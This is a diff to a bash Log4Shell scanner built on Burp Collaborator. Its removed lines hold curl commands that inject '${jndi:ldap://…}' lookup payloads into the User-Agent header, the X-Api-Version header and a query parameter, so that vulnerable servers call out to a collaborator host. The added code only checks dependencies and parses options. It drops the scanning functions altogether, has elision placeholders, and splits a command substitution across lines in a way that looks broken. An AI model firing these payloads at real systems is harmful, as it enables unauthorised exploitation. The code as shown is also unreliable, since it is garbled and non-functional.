@@ -9,6 +9,7 @@
 #	░╚════╝░░░░╚═╝░░░╚═════╝░╚══════╝╚═╝░░╚═╝░╚════╝░╚═╝░░╚══╝╚══════╝
 
 
+
 doesCommandExist() {
     command -v "$1" >/dev/null 2>&1
     if [[ $? -ne 0 ]]; then
@@ -24,49 +25,69 @@ domainScan-DoesCommandExistReqText() {
     fi
 }
 
-#... (Same for other functions)
-
-domainScan() {
-    local domain=$1
-    local burpcollabid=$2
-    domainScan-DoesCommandExistReqText
-    for COMMAND in "curl" "httpx" "assetfinder" "subfinder" "amass"; do
-      doesCommandExist "${COMMAND}"
-    done
-    doesCommandExistReqMoreInfo
-    domainScan-DoesCommandExistReqExit
-
-    #... (Same for other parts)
-
-    curl -s --insecure --max-time 20 "$url" -H "X-Api-Version: \${jndi:ldap://$url_without_protocol_and_port.$burpcollabid/a}" > /dev/null
-    curl -s --insecure --max-time 20 "$url/?test=\${jndi:ldap://$url_without_protocol_and_port.$burpcollabid/a}" > /dev/null
-    curl -s --insecure --max-time 20 "$url" -H "User-Agent: \${jndi:ldap://$url_without_protocol_and_port.$burpcollabid/a}" > /dev/null
-    echo -e "\033[104m[ DOMAIN ==> $url ]\033[0m" "\n" "\033[92m Method 1 ==> X-Api-Version: running-Ldap-payload" "\n" " Method 2 ==> Useragent: running-Ldap-payload" "\n" " Method 3 ==> $url/?test=running-Ldap-payload" "\n\033[0m"
+domainScan-DoesCommandExistReqExit() {
+    if [[ $(command -v "curl" >/dev/null 2>&1 ; echo $?) -ne 0 || $(command -v "httpx" >/dev/null 2>&1 ; echo $?) -ne 0 || $(command -v "assetfinder" >/dev/null 2>&1 ; echo $?) -ne 0 || $(command -v "subfinder" >/dev/null 2>&1 ; echo $?) -ne 0 || $(command -v "amass" >/dev/null 2>&1 ; echo $?) -ne 0 ]]; then
+      exit
+    fi
 }
 
-#... (Same for listScan function)
+listScan-DoesCommandExistReqText() {
+    if [[ $(command -v "curl" >/dev/null 2>&1 ; echo $?) -ne 0 || $(command -v "httpx" >/dev/null 2>&1 ; echo $?) -ne 0 ]]; then
+      echo -e "\n$(tput setaf 3 ; tput rev ; tput bold) ! Warning ! $(tput sgr0)"      
+      echo -e "$(tput setaf 3)Using this feature requires special requirements. It has been detected that the requirements are not installed on your system. $(tput sgr0)"
+      echo -e "\n$(tput setaf 3 ; tput bold)Please install these tools: $(tput sgr0)"
+    fi
+}
 
-while [[ "$1" =~ ^- && ! "$1" == "--" ]]; do case $1 in
-  -l | --url-list )
-    shift
-        local list=$1
-    ;;
-  -d | --domain )
-    shift
-    local domain=$1
-    ;;
-  -b | --burpcollabid )
-    shift
-    local burpcollabid=$1
-    ;;
-esac; shift; done
-if [[ "$1" == '--' ]]; then shift; fi
+listScan-DoesCommandExistReqExit() {
+    if [[ $(command -v "curl" >/dev/null 2>&1 ; echo $?) -ne 0 || $(command -v "httpx" >/dev/null 2>&1 ; echo $?) -ne 0 ]]; then
+      exit
+    fi
+}
 
-if [[ -n $domain ]]; then
-  domainScan $domain $burpcollabid
-elif [[ -n $list ]]; then
-  listScan $list $burpcollabid
-else
-  echo "Please provide a domain (-d) or a URL list (-l) and a burp collaborator ID (-b)"
+doesCommandExistReqMoreInfo() {
+    if [[ $(command -v "curl" >/dev/null 2>&1 ; echo $?) -ne 0 || $(command -v "httpx" >/dev/null 2>&1 ; echo $?) -ne 0 || $(command -v "assetfinder" >/dev/null 2>&1
+    ; echo $?) -ne 0 || $(command -v "subfinder" >/dev/null 2>&1 ; echo $?) -ne 0 || $(command -v "amass" >/dev/null 2>&1 ; echo $?) -ne 0 ]]; then
+      echo -e "$(tput setaf 3)  - curl $(tput sgr0)"
+      doesCommandExist "curl"
+      echo -e "$(tput setaf 3)  - httpx $(tput sgr0)"
+      doesCommandExist "httpx"
+      echo -e "$(tput setaf 3)  - assetfinder $(tput sgr0)"
+      doesCommandExist "assetfinder"
+      echo -e "$(tput setaf 3)  - subfinder $(tput sgr0)"
+      doesCommandExist "subfinder"
+      echo -e "$(tput setaf 3)  - amass $(tput sgr0)"
+      doesCommandExist "amass"
+      echo -e "\n$(tput setaf 3 ; tput bold)You can install the required tools from here: $(tput sgr0)"
+      echo -e "$(tput setaf 3)  - curl: https://curl.se/download.html $(tput sgr0)"
+      echo -e "$(tput setaf 3)  - httpx: https://github.com/projectdiscovery/httpx#installation $(tput sgr0)"
+      echo -e "$(tput setaf 3)  - assetfinder: https://github.com/tomnomnom/assetfinder#install $(tput sgr0)"
+      echo -e "$(tput setaf 3)  - subfinder: https://github.com/projectdiscovery/subfinder#installation $(tput sgr0)"
+      echo -e "$(tput setaf 3)  - amass: https://github.com/OWASP/Amass#installation $(tput sgr0)"
+      exit
+    fi
+}
+
+while getopts "d:l:b:" OPTION
+do
+    case $OPTION in
+        d)
+            DOMAIN=$OPTARG
+            domainScan-DoesCommandExistReqText
+            domainScan-DoesCommandExistReqExit
+            ;;
+        l)
+            LIST=$OPTARG
+            listScan-DoesCommandExistReqText
+            listScan-DoesCommandExistReqExit
+            ;;
+        b)
+            BURP=$OPTARG
+            ;;
+    esac
+done
+
+if [[ -z $DOMAIN && -z $LIST || -z $BURP ]]; then
+    echo "Please provide a domain (-d) or a URL list (-l) and a burp collaborator ID (-b)"
+    doesCommandExistReqMoreInfo
 fi
-
